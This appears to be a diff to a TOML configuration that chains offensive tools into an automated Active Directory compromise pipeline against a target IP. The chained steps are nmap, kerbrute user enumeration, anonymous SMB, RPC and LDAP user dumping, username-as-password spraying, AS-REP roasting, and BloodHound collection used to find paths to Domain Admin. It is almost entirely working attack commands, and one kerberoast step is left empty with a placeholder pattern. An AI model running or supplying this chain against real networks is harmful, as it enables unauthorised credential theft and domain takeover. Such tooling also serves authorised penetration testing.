@@ -1,53 +1,270 @@
 [[START]]
 name = "nmap"
 run_once = true
+cmd = "nmap -v -sVC -oA {output_dir}nmap -Pn {ip}"
+
+  [[START.patterns]]
+  "Discovered open port (445|139)" = [
+    "SMB SERVICE FOUND",
+    "RPC SERVICE FOUND"
+  ]
+
+  [[START.patterns]]
+  "Discovered open port (389)" = [
+    "LDAP SERVICE FOUND"
+  ]
 
 [[START]]
 name = "kerbrute-userenum"
-run_once = true
+cmd = """kerbrute userenum --dc {ip} -d {domain_name} {potential_usernames_file}"""
+
+  [[START.append_array]]
+  "usernames" = '''\[\+\] VALID USERNAME:\s*(.*)\x1b'''
+
+  [[START.patterns]]
+  "VALID USERNAME" = [
+    "VALID USERNAME FOUND"
+  ]
+
 
 [["SMB SERVICE FOUND"]]
 name = "smbclient-anonymous"
 run_once = true
+cmd = "smbclient -U ''%'' \\\\\\\\{ip}\\\\IPC$ -c 'AZERTY;q'"
+
+  [["SMB SERVICE FOUND".patterns]]
+  "AZERTY: command not found" = [
+    "SMB ANONYMOUS ACCESS ALLOWED"
+  ]
 
 [["LDAP SERVICE FOUND"]]
 name = "ldap-base"
+cmd = "ldapsearch -LLL -x -h {ip} -s base"
+
+  [["LDAP SERVICE FOUND".store]]
+  domain_name = "ldapServiceName: .*\\@(.*)$"
+
+  [["LDAP SERVICE FOUND".store]]
+  dc_dns = "dnsHostName: (.*?)$"
+
+  [["LDAP SERVICE FOUND".store]]
+  domain_dn = "rootDomainNamingContext: (.*?)$"
+
+  [["LDAP SERVICE FOUND".patterns]]
+  "rootDomainNamingContext: DC=.*$" = [
+    "TARGET IS A DOMAIN CONTROLLER"
+  ]
 
 [["TARGET IS A DOMAIN CONTROLLER"]]
 name = "ldap-anonymous-dc"
 run_once = true
+cmd = """
+ldapsearch -LLL -x -h {ip} -b '{domain_dn}' > {output_dir}ldap-anonymous-dc.txt;
+result=$(find {output_dir}ldap-anonymous-dc.txt -size +5);
+if [ ! -z $result ]
+then
+    echo "SUCCESS";
+fi"""
+
+  [["TARGET IS A DOMAIN CONTROLLER".store_static]]
+  ldap_dc_output_file = "{output_dir}ldap-anonymous-dc.txt"
+
+  [["TARGET IS A DOMAIN CONTROLLER".patterns]]
+  "SUCCESS" = [
+    "LDAP ANONYMOUS ACCESS TO DC"
+  ]
 
 [["LDAP ANONYMOUS ACCESS TO DC"]]
 name = "extract-ldap-users"
+cmd = """
+cat {output_dir}ldap-anonymous-dc.txt \
+| grep -A 30 "objectClass: user" \
+| grep "sAMAccountName:" \
+| cut -d" " -f2 > {output_dir}ldap_users.lst;
+cat {output_dir}ldap_users.lst;
+[ -s {output_dir}ldap_users.lst ] \
+&& echo '###USERS FOUND'"""
+
+  [["LDAP ANONYMOUS ACCESS TO DC".append_array]]
+  usernames = "^((?!###USERS).*)$" 
+  
+  [["LDAP ANONYMOUS ACCESS TO DC".patterns]]
+  "USERS FOUND" = [
+    "VALID USERNAME FOUND"
+  ]
 
 [["RPC SERVICE FOUND"]]
 name = "rpc-anonymous"
 run_once = true
+cmd = "rpcclient -U ''%'' {ip} -c 'AZERTY;quit' 2>/dev/null"
+
+  [["RPC SERVICE FOUND".patterns]]
+  "command not found: AZERTY" = [
+    "RPC ANONYMOUS ACCESS ALLOWED"
+  ]
 
 [["RPC ANONYMOUS ACCESS ALLOWED"]]
 name = "rpc-list-users"
 run_once = true
+cmd = """rpcclient -U ''%'' {ip} -c 'enumdomusers;quit' 2>/dev/null \
+| cut -d[ -f2 \
+| cut -d] -f1  > {output_dir}rpc_users.lst;
+cat {output_dir}rpc_users.lst;
+[ -s {output_dir}rpc_users.lst ] \
+&& grep -vq 'result was' {output_dir}rpc_users.lst \
+&& echo 'USERS FOUND'"""
+
+  [["RPC ANONYMOUS ACCESS ALLOWED".append_array]]
+  usernames = "^(?!USERS FOUND|RESULT WAS NT_STATUS_ACCESS_DENIED|result was NT_STATUS_ACCESS_DENIED|mkdir failed on directory| Unable to initialize)(.*)$" 
+
+  [["RPC ANONYMOUS ACCESS ALLOWED".patterns]]
+  "USERS FOUND" = [
+    "VALID USERNAME FOUND"
+  ]
 
 [["VALID USERNAME FOUND"]]
 name = "kerbrute-test-user-as-pass"
 run_once = true
+cmd = """lockfile-create --lock-name {output_dir}kerbrute.lock;
+python3 -c "a={usernames}; print('\\n'.join(a))" > {output_dir}usernames.tmp \
+&& sort -u {output_dir}usernames.tmp -f {output_dir}usernames.tmp;
+if [ -s {output_dir}usernames_validated.tmp ]; then \
+diff {output_dir}usernames.tmp {output_dir}usernames_validated.tmp \
+| grep "<" | sed -e 's/< //' > {output_dir}usernames_to_validate.tmp;
+else
+touch {output_dir}usernames_validated.tmp;
+mv {output_dir}usernames.tmp {output_dir}usernames_to_validate.tmp; 
+fi
+cat {output_dir}usernames_to_validate.tmp >> {output_dir}usernames_validated.tmp;
+kerbrute passwordspray --user-as-pass --dc {ip} -d {domain_name} {output_dir}usernames_to_validate.tmp;
+lockfile-remove --lock-name {output_dir}kerbrute.lock;"""
+
+  [["VALID USERNAME FOUND".append_array]]
+  "credentials" = '''\[\+\] VALID LOGIN:\s*(.*)\x1b'''
+
+  [["VALID USERNAME FOUND".patterns]]
+  "VALID LOGIN" = [
+    "VALID CREDENTIALS FOUND"
+  ]
 
 [["VALID USERNAME FOUND"]]
 name = "asreproast"
+cmd = """
+lockfile-create --lock-name {output_dir}asreproast.lock;
+python3 -c "a={usernames}; print('\\n'.join(x.split('@')[0] for x in a))" > {output_dir}asrep_users.tmp \
+&& sort -u {output_dir}asrep_users.tmp -f {output_dir}asrep_users.tmp;
+if [ -s {output_dir}asrep_users_validated.tmp ]; then \
+diff {output_dir}asrep_users.tmp {output_dir}asrep_users_validated.tmp \
+| grep "<" | sed -e 's/< //' > {output_dir}asrep_users_to_validate.tmp;
+else
+touch {output_dir}asrep_users_validated.tmp;
+mv {output_dir}asrep_users.tmp {output_dir}asrep_users_to_validate.tmp; 
+fi
+cat {output_dir}asrep_users_to_validate.tmp >> {output_dir}asrep_users_validated.tmp;
+GetNPUsers.py {domain_name}/ -usersfile {output_dir}asrep_users_to_validate.tmp -no-pass -dc-ip {ip} -outputfile {output_dir}asreproast.hash; 
+lockfile-remove --lock-name {output_dir}asreproast.lock;
+[ -s {output_dir}asreproast.hash ] && echo 'TGT FOUND'"""
+
+  [["VALID USERNAME FOUND".store_static]]
+  asreproast_hashes = "{output_dir}asreproast.hash"
+
+  [["VALID USERNAME FOUND".patterns]]
+  "TGT FOUND" = [
+    "TGT HASH FOUND"
+  ]
 
 [["VALID CREDENTIALS FOUND"]]
 name = "first-valid-creds"
 run_once = true
+cmd = '''python3 -c "a={credentials}; u,p=a[0].split(':'); print(f'USERNAME: {{u}}'); print(f'PASSWORD: {{p}}')";'''
+
+  [["VALID CREDENTIALS FOUND".store]]
+  user_default = '''^USERNAME: (.*?)$'''
+
+  [["VALID CREDENTIALS FOUND".store]]
+  password_default = '''^PASSWORD: (.*?)$'''
 
 [["VALID CREDENTIALS FOUND"]]
 name = "bloodhound-gather-info"
+cmd = "cd {output_dir}; mkdir -p bloodhound; cd bloodhound; python3 -m bloodhound -u {user_default} -p {password_default} -d {domain_name} -dc {dc_dns} -ns {ip} -c all"
 run_once = true
+
+  [["VALID CREDENTIALS FOUND".store]]
+  bloodhound_gathered = "INFO: Done"
+
+  [["VALID CREDENTIALS FOUND".patterns]]
+  "INFO: Done" = [
+    "BLOODHOUND GATHERED"
+  ]
 
 [["VALID CREDENTIALS FOUND"]]
 name = "bloodhound-add-owned-users"
+cmd = """echo {bloodhound_imported}; python3 -c "a={credentials}; print('\\n'.join(a))" | cut -d'@' -f1 | cut -d':' -f1 > {output_dir}owned_users.lst \
+&& sort -u {output_dir}owned_users.lst -f {output_dir}owned_users.lst;
+python3 ~/programs/bloodhound/bloodhound_manager.py set user-owned -l {output_dir}owned_users.lst -d {domain_name};"""
+iterate_over = "credentials"
+
+  [["VALID CREDENTIALS FOUND".patterns]]
+  "Done$" = [
+    "OWNED USERS ADDED"
+  ]
 
 [["VALID CREDENTIALS FOUND"]]
 name = "kerberoast"
+cmd = ""
+
+  [["VALID CREDENTIALS FOUND".patterns]]
+  "okok" = [
+    "TGS HASH FOUND"
+  ]
+
+[["VALID CREDENTIALS FOUND"]]
+name = "extract-ldap-users-authenticated"
+cmd = """
+ldapsearch -LLL -x -h {ip} -D "{user_default}@{domain_name}" -w {password_default} -b '{domain_dn}' "(objectClass=User)" sAMAccountName \
+| grep "sAMAccountName:" \
+| cut -d" " -f2 > {output_dir}ldap_users.lst;
+cat {output_dir}ldap_users.lst;
+[ -s {output_dir}ldap_users.lst ] \
+&& echo '###USERS FOUND'"""
+
+  [["VALID CREDENTIALS FOUND".append_array]]
+  usernames = "^((?!###USERS).*)$" 
+  
+  [["VALID CREDENTIALS FOUND".patterns]]
+  "USERS FOUND" = [
+    "VALID USERNAME FOUND"
+  ]
+
+
+[["BLOODHOUND GATHERED"]]
+name = "bloodhound-import"
+cmd = "bloodhound-import -du neo4j -dp Bloodhound {output_dir}bloodhound/*"
+run_once = true
+
+  [["BLOODHOUND GATHERED".store]]
+  bloodhound_imported = "Done"
 
 [["OWNED USERS ADDED"]]
 name = "bloodhound-check-shortest-path"
+cmd = "echo {bloodhound_imported}; python3 ~/programs/bloodhound/bloodhound_manager.py get path-to-da-owned-users"
+iterate_over = "credentials"
+
+  [["OWNED USERS ADDED".patterns]]
+  'Path to DA found for user'  = [
+    "PATH TO DA FOUND"
+  ]
+
+
+[[LISTENERS]]
+name = "manual-user-add"
+file = "{output_dir}credentials.lst"
+listener = true
+
+  [[LISTENERS.append_array]]
+  "credentials" = '(.*)'
+
+  [[LISTENERS.patterns]]
+  "(.*)" = [
+    "VALID CREDENTIALS FOUND"
+  ]
